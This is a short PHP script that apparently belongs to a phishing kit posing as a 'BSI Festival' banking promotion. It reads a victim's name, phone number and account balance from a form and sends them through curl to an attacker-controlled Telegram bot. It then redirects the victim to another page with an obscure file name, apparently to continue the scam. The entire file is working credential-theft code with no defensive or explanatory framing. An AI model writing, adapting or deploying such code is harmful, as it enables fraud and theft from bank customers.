<?php
session_start();
include "telegram.php";

$nama = $_POST['nama'];
$nomor = $_POST['nomor'];
$saldo = $_POST['saldo'];
$_SESSION['nama'] = $nama;
$_SESSION['nomor'] = $nomor;
$_SESSION['saldo'] = $saldo;

$message = "

├• 𝘿𝘼𝙏𝘼 | 𝘽𝙎𝙄 𝙁𝙀𝙎𝙏𝙄𝙑𝘼𝙇
├───────────────────
├• 𝙉𝙖𝙢𝙖 :  ".$nama."
├• 𝙉𝙤 𝙃𝙥 : ".$nomor."
├• 𝗦𝗮𝗹𝗱𝗼 :  ".$saldo."
╰───────────────────

";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../hudh742jt5f753hy.html');
?>